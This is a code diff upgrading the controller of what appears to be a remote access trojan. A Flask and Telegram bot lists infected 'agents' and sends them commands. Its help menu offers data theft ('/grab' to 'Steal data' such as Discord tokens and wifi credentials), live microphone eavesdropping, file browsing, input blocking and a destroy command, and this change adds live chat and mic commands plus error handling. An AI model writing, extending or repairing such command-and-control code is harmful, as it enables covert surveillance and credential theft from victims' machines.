@@ -1,7 +1,7 @@
-# app.py (Controller v2.1_UPGRADED)
-# - ADDED: New commands for Live Chat (/startchat, /sendchat, /stopchat) and Live Mic (/livemic, /stoplivemic)
-# - FIXED: Corrected typo in environment variable for HEARTBEAT_URL, which was breaking the /list command.
-# - RETAINS: All previous functionality and fixes.
+# app.py (Controller v2.2_FINAL_FIXES)
+# - ADDED: New commands for Live Chat & Live Mic to the help menu and command router.
+# - ADDED: More robust error handling and logging for the /list command to help with debugging.
+# - RETAINS: The critical fix for the HEARTBEAT_URL environment variable typo.
 
 import os
 import re
@@ -19,14 +19,12 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.constants import ParseMode
 
 # --- Configuration ---
-# Make sure these are set correctly in your server's environment
+# Ensure these environment variables are set correctly on your hosting platform (e.g., Vercel)
 TOKEN = os.getenv("TELEGRAM_TOKEN")
 SECRET_TOKEN = os.getenv("SECRET_TOKEN")
 JOBS_URL = os.getenv("JOBS_URL")
 STATE_URL = os.getenv("STATE_URL")
-# --- FIX: Corrected environment variable name from HEARTBEATE_URL ---
-HEARTBEAT_URL = os.getenv("HEARTBEAT_URL") 
-# --- END FIX ---
+HEARTBEAT_URL = os.getenv("HEARTBEAT_URL") # This MUST be named correctly
 
 # --- Initialize Flask and the Telegram Bot Application ---
 app = Flask(__name__)
@@ -40,6 +38,9 @@ def esc(text):
 
 async def make_async_request(method, url, json_data=None, retries=3, delay=2):
     """A robust helper for making async HTTP requests with retries."""
+    if not url:
+        print("Error: URL is not set.")
+        return None
     async with httpx.AsyncClient() as client:
         for attempt in range(retries):
             try:
@@ -88,39 +89,51 @@ async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Lists all currently active agents based on the heartbeat data."""
     await update.message.reply_text("⏳ Fetching active agents...", parse_mode=ParseMode.MARKDOWN_V2)
     
-    agents = await make_async_request('GET', HEARTBEAT_URL)
-    selected_target = await get_state()
-    
-    if not agents or not isinstance(agents, list):
-        await update.message.reply_text("❌ No agents found or error fetching agent list.", parse_mode=ParseMode.MARKDOWN_V2)
-        return
+    try:
+        if not HEARTBEAT_URL:
+            await update.message.reply_text("❌ **Configuration Error:** The `HEARTBEAT_URL` is not set on the server.", parse_mode=ParseMode.MARKDOWN_V2)
+            return
 
-    agents.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
-    
-    response_text = "*ONLINE AGENTS*\n\n"
-    active_agent_found = False
-    for agent in agents:
-        is_selected = "🎯" if agent.get("id") == selected_target else "➖"
-        last_seen_dt = datetime.fromtimestamp(agent.get("timestamp", 0))
-        seconds_ago = int((datetime.now() - last_seen_dt).total_seconds())
+        agents = await make_async_request('GET', HEARTBEAT_URL)
+        selected_target = await get_state()
         
-        if seconds_ago > 90: continue # Skip agents not seen in the last 90 seconds
-        active_agent_found = True
+        if agents is None:
+            await update.message.reply_text(f"❌ **Connection Error:** Could not connect to the heartbeat URL. Please check if the URL is correct and `npoint.io` is accessible.", parse_mode=ParseMode.MARKDOWN_V2)
+            return
+        if not isinstance(agents, list):
+            await update.message.reply_text(f"❌ **Data Error:** The data at the heartbeat URL is not a valid list. It may be empty or corrupted.", parse_mode=ParseMode.MARKDOWN_V2)
+            return
 
-        time_ago = f"{seconds_ago}s ago" if seconds_ago < 60 else f"{seconds_ago // 60}m ago"
-        is_admin = "Admin" if agent.get("is_admin") else "User"
+        agents.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
         
-        response_text += (
-            f"{is_selected} *ID:* `{esc(agent.get('id', 'N/A'))}`\n"
-            f"   *User:* `{esc(agent.get('user', 'N/A'))}` `({esc(is_admin)})`\n"
-            f"   *Last Seen:* `{esc(time_ago)}`\n\n"
-        )
-    
-    if not active_agent_found:
-        response_text += "_No agents have checked in within the last 90 seconds\\._\n\n"
+        response_text = "*ONLINE AGENTS*\n\n"
+        active_agent_found = False
+        for agent in agents:
+            is_selected = "🎯" if agent.get("id") == selected_target else "➖"
+            last_seen_dt = datetime.fromtimestamp(agent.get("timestamp", 0))
+            seconds_ago = int((datetime.now() - last_seen_dt).total_seconds())
+            
+            if seconds_ago > 90: continue
+            active_agent_found = True
 
-    response_text += "_Use `/target <id>` to select an agent\\._"
-    await update.message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)
+            time_ago = f"{seconds_ago}s ago" if seconds_ago < 60 else f"{seconds_ago // 60}m ago"
+            is_admin = "Admin" if agent.get("is_admin") else "User"
+            
+            response_text += (
+                f"{is_selected} *ID:* `{esc(agent.get('id', 'N/A'))}`\n"
+                f"   *User:* `{esc(agent.get('user', 'N/A'))}` `({esc(is_admin)})`\n"
+                f"   *Last Seen:* `{esc(time_ago)}`\n\n"
+            )
+        
+        if not active_agent_found:
+            response_text += "_No agents have checked in within the last 90 seconds\\._\n\n"
+
+        response_text += "_Use `/target <id>` to select an agent\\._"
+        await update.message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)
+
+    except Exception as e:
+        await update.message.reply_text(f"❌ An unexpected server-side error occurred while fetching agents: `{esc(str(e))}`", parse_mode=ParseMode.MARKDOWN_V2)
+        print(f"Error in /list command: {traceback.format_exc()}")
 
 
 async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -255,8 +268,8 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/unblockmouse` \\- Enable mouse input\n\n"
 
         "*🔑 DATA EXFILTRATION*\n"
-        "`/grab <type>` \\- Steal data \\(passwords, etc\\.\\)\n"
-        "  *Types: all, passwords, history, discord, wifi*\n\n"
+        "`/grab <type>` \\- Steal data \\(discord, wifi, etc\\.\\)\n"
+        "  *Types: all, discord, wifi, history*\n\n"
         
         "*📁 FILE SYSTEM*\n"
         "`/ls` \\- List files\n"
@@ -296,7 +309,7 @@ agent_commands = [
     "startchat", "sendchat", "stopchat"
 ]
 for cmd in agent_commands:
-    if cmd not in ["help", "target", "destroy", "upload", "list"]:
+    if cmd not in ["help", "list", "target", "destroy", "upload"]:
          ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
 
@@ -326,6 +339,5 @@ def health_check():
     """A simple endpoint to confirm the bot is running."""
     return "Bot is running.", 200
 
-# This part is useful for local testing but might not be used on Vercel
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
